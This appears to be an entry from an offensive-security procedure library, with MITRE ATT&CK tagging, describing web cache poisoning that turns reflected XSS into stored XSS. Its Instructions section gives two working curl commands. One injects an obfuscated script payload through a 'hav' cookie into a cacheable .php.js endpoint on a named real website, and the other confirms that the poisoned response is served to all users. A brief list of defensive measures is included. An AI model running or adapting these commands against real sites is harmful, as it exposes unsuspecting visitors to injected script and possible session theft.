---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
name: Poison-Cache-with-Malicious-JavaScript-Endpoint
type: procedure
verified: false
submitted: true
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.643Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - cache-poisoning
  - xss
  - persistence
commands:
  - '[[commands/curl-poison-cache]]'
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Poison-Cache-with-Malicious-JavaScript-Endpoint

## Summary

This procedure poisons a shared cache by requesting a cacheable .js endpoint with a malicious cookie, causing the server to store and serve the injected XSS payload to all users.

## Description

The target endpoint generates dynamic JavaScript including user cookies but caches the full response without varying by cookie content. By setting a malicious 'hav' cookie and requesting the endpoint, the reflected XSS persists in cache, turning reflected XSS into stored XSS. This affects PHP sites with Varnish or similar caching.

## Requirements

1. Malicious cookie set from prior procedure
2. Cacheable endpoint identified (e.g., .php.js files)
3. Ability to make repeated requests to verify persistence

## Defense

Defensive measures and detection strategies:

- Use cache-busting parameters or user-specific cache keys for dynamic content
- Exclude user inputs like cookies from cacheable responses
- Log and alert on cache hits with anomalous content (e.g., script tags)
- Implement content validation before caching

## Objectives

1. Persist XSS payload in server cache
2. Affect multiple victims without repeated injections
3. Enable broad execution of stolen session logic

## Instructions

### Step 1: Send Poisoning Request

**Context**: Issue a GET request with the malicious cookie to trigger reflection and caching.

**Command** ([[commands/curl-poison-cache]]):
```bash
curl -H "Cookie: hav=xss</sc\"ript><sv\"g/onloa\"d=aler\"t(window.INITIAL_STATE.system.cookie)>" https://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js?xxxd -v
```

> The -v flag shows headers; look for cache-related headers like X-Cache: HIT on follow-up requests.

### Step 2: Verify Poisoning

**Context**: Request the endpoint again without the cookie to confirm the malicious content is cached.

**Command** ([[commands/curl-poison-cache]]):
```bash
curl https://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js?xxxd | grep -i script
```

> Expected output: Presence of injected <svg/onload=...> in the response, indicating successful poisoning.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-poison-cache]]

## Tools Used


## Tags

- [[cache-poisoning]]
- [[xss]]
- [[Persistence]]
